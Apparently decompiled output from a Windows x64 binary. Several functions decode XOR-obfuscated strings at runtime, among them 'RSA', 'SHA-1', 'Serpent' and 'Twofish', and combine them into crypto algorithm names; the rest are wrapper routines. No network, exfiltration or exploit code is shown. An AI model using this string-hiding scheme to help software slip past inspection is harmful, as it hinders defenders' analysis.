    byte_1400DD0DB = (v5 - 11) ^ 0x76;
    byte_1400DD0DC = (v5 - 12) ^ 0x31;
    byte_1400DD0DD = (v5 - 13) ^ 0x5F;
    byte_1400DD0DE = (v5 - 14) ^ 0x35;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xFui64 )
  {
    sub_140004790(Src, 0xFui64, 0i64);
    v5 = byte_1400DD0C5;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_WORD *)v6 + 6) = 0;
  *((_BYTE *)v6 + 14) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 15i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 15) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD0D0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xF );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0C5: using guessed type char byte_1400DD0C5;
// 1400DD0C8: using guessed type int dword_1400DD0C8;
// 1400DD0D1: using guessed type char byte_1400DD0D1;
// 1400DD0D2: using guessed type char byte_1400DD0D2;
// 1400DD0D3: using guessed type char byte_1400DD0D3;
// 1400DD0D4: using guessed type char byte_1400DD0D4;
// 1400DD0D5: using guessed type char byte_1400DD0D5;
// 1400DD0D6: using guessed type char byte_1400DD0D6;
// 1400DD0D7: using guessed type char byte_1400DD0D7;
// 1400DD0D8: using guessed type char byte_1400DD0D8;
// 1400DD0D9: using guessed type char byte_1400DD0D9;
// 1400DD0DA: using guessed type char byte_1400DD0DA;
// 1400DD0DB: using guessed type char byte_1400DD0DB;
// 1400DD0DC: using guessed type char byte_1400DD0DC;
// 1400DD0DD: using guessed type char byte_1400DD0DD;
// 1400DD0DE: using guessed type char byte_1400DD0DE;

//----- (000000014008AC70) ----------------------------------------------------
_QWORD *__fastcall sub_14008AC70(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0E0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0E0 & 1 )
  {
    v5 = byte_1400DD0DF;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0E0 | 1;
    dword_1400DD034 = v4;
    dword_1400DD0E0 |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0DF = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0E0 = v1 | 2;
    byte_1400DD0E4[0] = v5 ^ 0x52;
    byte_1400DD0E5 = (v5 - 1) ^ 0x53;
    byte_1400DD0E6 = (v5 - 2) ^ 0x41;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 3ui64 )
  {
    sub_140004790(Src, 3ui64, 0i64);
    v5 = byte_1400DD0DF;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_WORD *)v6 = 0;
  *((_BYTE *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 3i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 3) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD0E4[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 3 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0DF: using guessed type char byte_1400DD0DF;
// 1400DD0E0: using guessed type int dword_1400DD0E0;
// 1400DD0E5: using guessed type char byte_1400DD0E5;
// 1400DD0E6: using guessed type char byte_1400DD0E6;

//----- (000000014008AE10) ----------------------------------------------------
_QWORD *__fastcall sub_14008AE10(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0BC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0BC & 1 )
  {
    v5 = byte_1400DD0B8;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0BC | 1;
    dword_1400DD034 = v4;
    dword_1400DD0BC |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0B8 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0BC = v1 | 2;
    byte_1400DD0C0[0] = v5 ^ 0x53;
    byte_1400DD0C1 = (v5 - 1) ^ 0x48;
    byte_1400DD0C2 = (v5 - 2) ^ 0x41;
    byte_1400DD0C3 = (v5 - 3) ^ 0x2D;
    byte_1400DD0C4 = (v5 - 4) ^ 0x31;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 5ui64 )
  {
    sub_140004790(Src, 5ui64, 0i64);
    v5 = byte_1400DD0B8;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_BYTE *)v6 + 4) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 5i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 5) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD0C0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 5 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0B8: using guessed type char byte_1400DD0B8;
// 1400DD0BC: using guessed type int dword_1400DD0BC;
// 1400DD0C1: using guessed type char byte_1400DD0C1;
// 1400DD0C2: using guessed type char byte_1400DD0C2;
// 1400DD0C3: using guessed type char byte_1400DD0C3;
// 1400DD0C4: using guessed type char byte_1400DD0C4;

//----- (000000014008AFC0) ----------------------------------------------------
_QWORD *__fastcall sub_14008AFC0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0FC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0FC & 1 )
  {
    v5 = byte_1400DD0FB;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0FC | 1;
    dword_1400DD034 = v4;
    dword_1400DD0FC |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0FB = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0FC = v1 | 2;
    byte_1400DD100[0] = v5 ^ 0x53;
    byte_1400DD101 = (v5 - 1) ^ 0x65;
    byte_1400DD102 = (v5 - 2) ^ 0x72;
    byte_1400DD103 = (v5 - 3) ^ 0x70;
    byte_1400DD104 = (v5 - 4) ^ 0x65;
    byte_1400DD105 = (v5 - 5) ^ 0x6E;
    byte_1400DD106 = (v5 - 6) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DD0FB;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD100[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0FB: using guessed type char byte_1400DD0FB;
// 1400DD0FC: using guessed type int dword_1400DD0FC;
// 1400DD101: using guessed type char byte_1400DD101;
// 1400DD102: using guessed type char byte_1400DD102;
// 1400DD103: using guessed type char byte_1400DD103;
// 1400DD104: using guessed type char byte_1400DD104;
// 1400DD105: using guessed type char byte_1400DD105;
// 1400DD106: using guessed type char byte_1400DD106;

//----- (000000014008B190) ----------------------------------------------------
_QWORD *__fastcall sub_14008B190(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0F0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0F0 & 1 )
  {
    v5 = byte_1400DD0EF;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0F0 | 1;
    dword_1400DD034 = v4;
    dword_1400DD0F0 |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0EF = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0F0 = v1 | 2;
    byte_1400DD0F4[0] = v5 ^ 0x54;
    byte_1400DD0F5 = (v5 - 1) ^ 0x77;
    byte_1400DD0F6 = (v5 - 2) ^ 0x6F;
    byte_1400DD0F7 = (v5 - 3) ^ 0x66;
    byte_1400DD0F8 = (v5 - 4) ^ 0x69;
    byte_1400DD0F9 = (v5 - 5) ^ 0x73;
    byte_1400DD0FA = (v5 - 6) ^ 0x68;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DD0EF;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD0F4[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0EF: using guessed type char byte_1400DD0EF;
// 1400DD0F0: using guessed type int dword_1400DD0F0;
// 1400DD0F5: using guessed type char byte_1400DD0F5;
// 1400DD0F6: using guessed type char byte_1400DD0F6;
// 1400DD0F7: using guessed type char byte_1400DD0F7;
// 1400DD0F8: using guessed type char byte_1400DD0F8;
// 1400DD0F9: using guessed type char byte_1400DD0F9;
// 1400DD0FA: using guessed type char byte_1400DD0FA;

//----- (000000014008B360) ----------------------------------------------------
__int64 __fastcall sub_14008B360(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 152i64))(a1 - 16);
}

//----- (000000014008B370) ----------------------------------------------------
unsigned __int64 __fastcall sub_14008B370(__int64 a1, unsigned __int64 a2)
{
  if ( a2 > 0x20 )
    a2 = 32i64;
  return a2;
}

//----- (000000014008B380) ----------------------------------------------------
__int64 __fastcall sub_14008B380(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  sub_14003C000(a2, a1 + 24);
  return v2;
}

//----- (000000014008B3B0) ----------------------------------------------------
char __fastcall sub_14008B3B0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rax

  v1 = a1 + 16;
  v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 8i64))(a1 + 16);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v2 + 48i64))(v2) )
    (*(void (__fastcall **)(signed __int64))(*(_QWORD *)v1 + 16i64))(v1);
  return 1;
}

//----- (000000014008B3E4) ----------------------------------------------------
__int64 __fastcall sub_14008B3E4(__int64 a1)
{
  return sub_140050EC0(a1 - 80);
}

//----- (000000014008B3F0) ----------------------------------------------------
__int64 __fastcall sub_14008B3F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  __int64 v4; // rax
  void *v5; // rdx
  char v7; // [rsp+30h] [rbp-38h]
  __int64 v8; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v2 = a2;
  v3 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 16i64))(a1, &v7);
  v4 = sub_14003CF00(v3);
  sub_14003C000(v2, v4);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v2;
}

//----- (000000014008B470) ----------------------------------------------------
signed __int64 sub_14008B470()
{
  return 32i64;
}

//----- (000000014008B480) ----------------------------------------------------
__int64 __fastcall sub_14008B480(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  __int64 v4; // rax
  void *v5; // rdx
  char v7; // [rsp+30h] [rbp-38h]
  __int64 v8; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v2 = a2;
  v3 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 8i64))(a1, &v7);
  v4 = sub_14003CF00(v3);
  sub_14003C000(v2, v4);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v2;
}

//----- (000000014008B500) ----------------------------------------------------
__int64 __fastcall sub_14008B500(__int64 a1)
{
  __int64 v1; // r14
  _QWORD *v2; // rax
  __int64 v3; // rbp
  _QWORD *v4; // rsi
  __int64 v5; // rdi
  __int64 v6; // rbx
  __int64 v7; // rax
  char v9; // [rsp+20h] [rbp-18h]

  v1 = a1;
  v2 = (_QWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16);
  v3 = *v2;
  v4 = v2;
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 144i64))(v1);
  v6 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 136i64))(v1, &v9);
  v7 = sub_140060F80(v1);
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD, __int64))(v3 + 16))(v4, v7, *(_QWORD *)(v6 + 8), v5);
}

//----- (000000014008B590) ----------------------------------------------------
signed __int64 __fastcall sub_14008B590(__int64 a1, __int64 a2, __int64 a3)
{
  return 8 * (a2 + a3) + 80;
}

//----- (000000014008B610) ----------------------------------------------------
__int64 __fastcall sub_14008B610(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 24i64))(v1);
}

//----- (000000014008B6C0) ----------------------------------------------------
__int64 __fastcall sub_14008B6C0(__int64 a1)
{
  return sub_140052050(a1 - 80);
}

//----- (000000014008B6D0) ----------------------------------------------------
__int64 __fastcall sub_14008B6D0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  unsigned int v3; // ebx
  void *v4; // rdx
  char v6; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v1 = (**(__int64 (__cdecl ***)(signed __int64))(a1 + 16))(a1 + 16);
  v2 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 24i64))(v1, &v6);
  v3 = sub_1400453C0(v2);
  v4 = Memory;
  memset(Memory, 0, 8 * v7);
  free(v4);
  return v3;
}

//----- (000000014008B730) ----------------------------------------------------
_QWORD *__fastcall sub_14008B730(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14007C190(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14008A8A0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014008B840) ----------------------------------------------------
_QWORD *__fastcall sub_14008B840(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14008BEC0(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14008A8A0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014008B950) ----------------------------------------------------
_QWORD *__fastcall sub_14008B950(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14008BF80(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14008A8A0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014008BA60) ----------------------------------------------------
_QWORD *__fastcall sub_14008BA60(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14008BFC0(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14008A8A0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014008BB70) ----------------------------------------------------
_QWORD *__fastcall sub_14008BB70(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14008C080(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14008A8A0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014008BC80) ----------------------------------------------------
_QWORD *__fastcall sub_14008BC80(_QWORD *a1)
{
  _QWORD *v1; // rdi
  _QWORD *v2; // rax
  _BYTE *v3; // rbx
  size_t v4; // r8
  _QWORD *v5; // rsi
  _QWORD *v6; // rax
  _BYTE *v7; // rbx
  _QWORD *v8; // rax
  _QWORD *v9; // rsi
  _QWORD *v10; // rax
  _BYTE *v11; // rbx
  _QWORD *v12; // rax
  void *Src; // [rsp+30h] [rbp-71h]
  void *Dst; // [rsp+38h] [rbp-69h]
  __int64 v16; // [rsp+48h] [rbp-59h]
  unsigned __int64 v17; // [rsp+50h] [rbp-51h]
  void *v18; // [rsp+58h] [rbp-49h]
  __int64 v19; // [rsp+68h] [rbp-39h]
  unsigned __int64 v20; // [rsp+70h] [rbp-31h]
  void *v21; // [rsp+78h] [rbp-29h]
  __int64 v22; // [rsp+88h] [rbp-19h]
  unsigned __int64 v23; // [rsp+90h] [rbp-11h]
  void *v24; // [rsp+98h] [rbp-9h]
  __int64 v25; // [rsp+A8h] [rbp+7h]
  unsigned __int64 v26; // [rsp+B0h] [rbp+Fh]
  void *v27; // [rsp+B8h] [rbp+17h]
  __int64 v28; // [rsp+C8h] [rbp+27h]
  unsigned __int64 v29; // [rsp+D0h] [rbp+2Fh]

  v1 = a1;
  v2 = sub_14008AC70(&Src);
  v3 = v2;
  if ( v2[3] >= 0x10ui64 )
    v3 = (_BYTE *)*v2;
  if ( (unsigned __int64)Src >= 0x10 )
    operator delete(Src);
  Src = (void *)15;
  LOBYTE(Src) = 0;
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *v3 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( v3[v4] );
  }
  else
  {
    v4 = 0i64;
  }
  sub_140004F20(&Dst, v3, v4);
  v5 = sub_14000DAC0(&v27, &Dst, &unk_1400AB1E0);
  v6 = sub_14008AA40(&Src);
  v7 = v6;
  if ( v6[3] >= 0x10ui64 )
    v7 = (_BYTE *)*v6;
  if ( (unsigned __int64)Src >= 0x10 )
    operator delete(Src);
  Src = (void *)15;
  LOBYTE(Src) = 0;
  v8 = sub_14000DAC0(&v21, v5, v7);
  v9 = sub_14000DAC0(&v18, v8, "(");
  v10 = sub_14008AE10(&Src);
  v11 = v10;
  if ( v10[3] >= 0x10ui64 )
    v11 = (_BYTE *)*v10;
  if ( (unsigned __int64)Src >= 0x10 )
    operator delete(Src);
  Src = (void *)15;
  LOBYTE(Src) = 0;
  v12 = sub_14000DAC0(&v24, v9, v11);
  sub_14000DAC0(v1, v12, ")");
  if ( v26 >= 0x10 )
    operator delete(v24);
  v26 = 15i64;
  v25 = 0i64;
  LOBYTE(v24) = 0;
  if ( v20 >= 0x10 )
    operator delete(v18);
  v20 = 15i64;
  v19 = 0i64;
  LOBYTE(v18) = 0;
  if ( v23 >= 0x10 )
    operator delete(v21);
  v23 = 15i64;
  v22 = 0i64;
  LOBYTE(v21) = 0;
  if ( v29 >= 0x10 )
    operator delete(v27);
  v29 = 15i64;
  v28 = 0i64;
  LOBYTE(v27) = 0;
  if ( v17 >= 0x10 )
    operator delete(Dst);
  return v1;
}

